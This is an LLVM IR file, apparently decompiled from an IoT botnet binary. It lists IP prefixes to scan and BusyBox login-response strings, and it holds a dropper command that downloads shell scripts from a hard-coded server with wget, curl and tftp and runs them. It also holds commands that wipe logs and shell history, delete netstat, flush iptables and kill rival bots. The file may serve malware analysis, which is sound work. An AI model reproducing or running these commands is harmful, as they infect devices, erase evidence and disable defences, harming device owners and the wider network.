source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805e00c.2 = global i32 0
@global_var_805e024.3 = local_unnamed_addr global i32* @global_var_805e00c.2
@global_var_805d4c4.4 = constant i32 0
@global_var_805e464.5 = global i32 0
@global_var_805e010.6 = local_unnamed_addr global i32 0
@global_var_805e4a0.7 = global i32 0
@global_var_805e4a4.8 = local_unnamed_addr global i32 0
@global_var_805e4a8.9 = local_unnamed_addr global i32 0
@global_var_805e0f8.10 = local_unnamed_addr global i32 4095
@global_var_805e0f4.11 = local_unnamed_addr global i32 362436
@global_var_8058c8d.12 = constant [7 x i8] c"(null)\00"
@global_var_8058c94.14 = constant [3 x i8] c"-c\00"
@global_var_8058c97.15 = constant [3 x i8] c"sh\00"
@global_var_8058c9a.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8058cc0.17 = constant i32 -1
@global_var_80590c0.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_80590ce.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_80590d7.21 = constant [5 x i8] c"PING\00"
@global_var_80590dc.22 = constant [14 x i8] c"gethostbyname\00"
@global_var_805e488.23 = local_unnamed_addr global i32 0
@global_var_805e48c.24 = local_unnamed_addr global i32 0
@global_var_8064714.25 = local_unnamed_addr global i32 0
@global_var_80590ea.26 = constant [6 x i8] c":>%$#\00"
@global_var_80590f1.31 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_80590fd.32 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_805910b.33 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_8059116.34 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_8059123.35 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_805912e.36 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_805913b.37 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_8059147.38 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_8059154.39 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_8059161.40 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_805916e.41 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_805917c.42 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_8059187.43 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_8059194.44 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_80591a1.45 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_80591ae.46 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_80591bb.47 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_80591c8.48 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_80591d5.49 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_80591e2.50 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_80591ed.51 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_80591f9.52 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_8059206.53 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_8059211.54 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_805921c.55 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_8059228.56 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_8059234.57 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_8059240.58 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_805924d.59 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_805925a.60 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_8059266.61 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_8059273.62 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_805927f.63 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_805928a.64 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_8059296.65 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_80592a2.66 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_80592ae.67 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_80592ba.68 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_80592c6.69 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_80592d3.70 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_80592e0.71 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_80592ed.72 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_80592fa.73 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_8059307.74 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_8059314.75 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_8059321.76 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_805932e.77 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_805933b.78 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_8059348.79 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_8059355.80 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_8059363.81 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_8059370.82 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_805937e.83 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_805938b.84 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_8059399.85 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_80593a7.86 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_80593b4.87 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_80593c1.88 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_80593ce.89 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_80593db.90 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_80593e8.91 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_80593f5.92 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_8059402.93 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_805940f.94 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_805941c.95 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_8059429.96 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_8059436.97 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_8059443.98 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_8059450.99 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_805945d.100 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_805946a.101 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_8059477.102 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_8059484.103 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_8059491.104 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_805949e.105 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_80594ab.106 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_80594b8.107 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_80594c5.108 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_80594d2.109 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_80594df.110 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_80594ec.111 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_80594f9.112 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_8059506.113 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_8059513.114 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_8059520.115 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_805952d.116 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_805953a.117 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_8059547.118 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_8059554.119 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_8059561.120 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_805956e.121 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_805957b.122 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_8059588.123 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_8059595.124 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_80595a2.125 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_80595af.126 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_80595bc.127 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_80595c9.128 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_80595d6.129 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_80595e2.130 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_80595ef.131 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_80595fc.132 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_8059609.133 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_8059615.134 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_8059622.135 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_8059630.136 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_805963e.137 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_805964b.138 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_8059659.139 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_8059667.140 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_8059674.141 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_8059682.142 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_805968f.143 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_805969c.144 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_80596aa.145 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_80596b8.146 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_80596c6.147 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_80596d4.148 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_80596e1.149 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_80596ed.150 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_80596fb.151 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_8059709.152 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_8059717.153 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_8059725.154 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_8059733.155 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_8059741.156 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_805974f.157 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_805975d.158 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_805976b.159 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_8059779.160 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_8059787.161 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_8059795.162 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_80597a2.163 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_80597af.164 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_80597bc.165 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_80597c9.166 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_80597d6.167 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_80597e3.168 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_80597f1.169 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_80597ff.170 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_805980d.171 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_805981a.172 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_8059827.173 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_8059835.174 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_8059843.175 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_8059851.176 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_805985e.177 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_805986b.178 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_8059878.179 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_8059885.180 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_8059892.181 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_805989e.182 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_80598ac.183 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_80598b9.184 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_80598c7.185 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_80598d5.186 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_80598e3.187 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_80598f0.188 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_80598fe.189 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_805990c.190 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_805991a.191 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_8059928.192 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_8059936.193 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_8059944.194 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_8059951.195 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_805995f.196 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_805996d.197 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_805997b.198 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_8059988.199 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_8059995.200 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_80599a2.201 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_80599af.202 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_80599bc.203 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_80599c9.204 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_80599d6.205 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_80599e4.206 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_80599f2.207 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_8059a00.208 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_8059a0e.209 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_8059a1c.210 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_8059a2a.211 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_8059a37.212 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_8059a44.213 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_8059a52.214 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_8059a60.215 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_8059a6e.216 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_8059a7c.217 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_8059a8a.218 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_8059a98.219 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_8059aa6.220 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_8059ab4.221 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_8059ac1.222 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_8059ace.223 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_8059adb.224 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_8059ae8.225 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_8059af5.226 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_8059b02.227 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_8059b10.228 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_8059b1d.230 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_8064708.231 = local_unnamed_addr global i32 0
@global_var_8058c81.232 = constant [8 x i8] c"BusyBox\00"
@global_var_8058c89.233 = constant i32 2293796
@global_var_8058c8b.234 = constant i32 1848115235
@global_var_805e0a0.235 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058c81.232, i32 0, i32 0), i8* bitcast (i32* @global_var_8058c89.233 to i8*), i8* bitcast (i32* @global_var_8058c8b.234 to i8*)]
@global_var_8058c55.236 = constant [7 x i8] c"nvalid\00"
@global_var_8058c5c.237 = constant [6 x i8] c"ailed\00"
@global_var_8058c62.238 = constant [9 x i8] c"ncorrect\00"
@global_var_8058c6b.239 = constant [6 x i8] c"enied\00"
@global_var_8058c71.240 = constant [5 x i8] c"rror\00"
@global_var_8058c76.241 = constant [7 x i8] c"oodbye\00"
@global_var_8058c7d.242 = constant [4 x i8] c"bad\00"
@global_var_805e080.243 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058c55.236, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058c5c.237, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058c62.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058c6b.239, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058c71.240, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058c76.241, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c7d.242, i32 0, i32 0)]
@global_var_805e064 = external global i32
@global_var_8059b29.248 = constant [3 x i8] c"\0D\0A\00"
@global_var_805e0c0.249 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058c55.236, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058c5c.237, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058c62.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058c6b.239, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058c71.240, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058c76.241, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c7d.242, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058c81.232, i32 0, i32 0), i8* bitcast (i32* @global_var_8058c89.233 to i8*), i8* bitcast (i32* @global_var_8058c8b.234 to i8*)]
@global_var_8059b2c.250 = constant i32 993024795
@global_var_8059b95.251 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_8058b00.252 = constant [318 x i8] c"cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A\00"
@global_var_805e060.253 = local_unnamed_addr global [318 x i8]* @global_var_8058b00.252
@global_var_8059bd0.255 = constant [327 x i8] c"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A x00\00"
@global_var_8059d18.256 = constant [320 x i8] c"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A\00"
@global_var_8059fdc.257 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_8059feb.258 = constant [6 x i8] c"/tmp/\00"
@global_var_8059ff1.259 = constant [6 x i8] c"/var/\00"
@global_var_8059ff7.260 = constant [6 x i8] c"/dev/\00"
@global_var_8059ffd.261 = constant [10 x i8] c"/var/run/\00"
@global_var_805a007.262 = constant [10 x i8] c"/dev/shm/\00"
@global_var_805a011.263 = constant [6 x i8] c"/mnt/\00"
@global_var_805a017.264 = constant [7 x i8] c"/boot/\00"
@global_var_805a01e.265 = constant [6 x i8] c"/usr/\00"
@global_var_805a040.266 = constant [9 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8059fdc.257, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059feb.258, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ff1.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ff7.260, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059ffd.261, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a007.262, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a011.263, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a017.264, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a01e.265, i32 0, i32 0)]
@global_var_8059f20.267 = constant [5 x i8] c"wget\00"
@global_var_8059f25.268 = constant [6 x i8] c"armv*\00"
@global_var_8059ea6.269 = constant [5 x i8] c"bot*\00"
@global_var_8059f2b.270 = constant [6 x i8] c"ntpd*\00"
@global_var_8059eb6.271 = constant [7 x i8] c"hackz*\00"
@global_var_8059f31.272 = constant [8 x i8] c"shitty*\00"
@global_var_8059f39.273 = constant [6 x i8] c"jack*\00"
@global_var_8059e86.274 = constant [6 x i8] c"mips*\00"
@global_var_8059e6e.275 = constant [5 x i8] c"sex*\00"
@global_var_8059f3f.276 = constant [4 x i8] c"i86\00"
@global_var_8059f43.277 = constant [5 x i8] c"ssh*\00"
@global_var_8059ea1.278 = constant [5 x i8] c"sh4*\00"
@global_var_8059eab.279 = constant [11 x i8] c"jackmeoff*\00"
@global_var_8059e73.280 = constant [6 x i8] c"tftp*\00"
@global_var_8059f48.281 = constant [4 x i8] c"i56\00"
@global_var_8059f4c.282 = constant [5 x i8] c"mips\00"
@global_var_8059f51.283 = constant [7 x i8] c"mipsel\00"
@global_var_8059f58.284 = constant [4 x i8] c"sh4\00"
@global_var_8059f5c.285 = constant [4 x i8] c"x86\00"
@global_var_8059f60.286 = constant [5 x i8] c"i686\00"
@global_var_8059f65.287 = constant [4 x i8] c"ppc\00"
@global_var_8059f69.288 = constant [5 x i8] c"i586\00"
@global_var_8059f80.289 = constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059f20.267, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059f25.268, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ea6.269, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059f2b.270, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059eb6.271, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059f31.272, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059f39.273, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059e86.274, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059e6e.275, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f3f.276, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059f43.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ea1.278, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059eab.279, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059e73.280, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f48.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059f4c.282, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059f51.283, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f58.284, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f5c.285, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059f60.286, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059f65.287, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059f69.288, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059f69.288, i32 0, i32 0)]
@global_var_8059e58.290 = constant [8 x i8] c"jackmy*\00"
@global_var_8059e60.291 = constant [9 x i8] c"busybox*\00"
@global_var_8059e69.292 = constant [5 x i8] c"bin*\00"
@global_var_8059e79.293 = constant [5 x i8] c"arm*\00"
@global_var_8059e7e.294 = constant [8 x i8] c"mipsel*\00"
@global_var_8059e8c.295 = constant [8 x i8] c"mips64*\00"
@global_var_8059e94.296 = constant [6 x i8] c"i686*\00"
@global_var_8059e9a.297 = constant [7 x i8] c"sparc*\00"
@global_var_8059ebd.298 = constant [6 x i8] c"bruv*\00"
@global_var_8059ee0.299 = constant [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059e58.290, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059e60.291, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059e69.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059e6e.275, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059e73.280, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059e79.293, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059e7e.294, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059e86.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059e8c.295, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059e94.296, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059e9a.297, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ea1.278, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ea6.269, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059eab.279, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059eb6.271, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059ebd.298, i32 0, i32 0)]
@global_var_805a068.300 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_805a0e9.302 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_805a0f8.303 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_805a123.304 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_805a138.305 = constant [22 x i8] c"history -c;history -w\00"
@global_var_805a14e.306 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_805a15c.307 = constant [11 x i8] c"history -c\00"
@global_var_805a167.308 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_805a17e.309 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_805a192.310 = constant [11 x i8] c"history -w\00"
@global_var_805a19d.311 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_805a1ae.312 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_805a1bc.313 = constant [22 x i8] c"service iptables stop\00"
@global_var_805a1d4.314 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_805a1f8.315 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_805a238.316 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
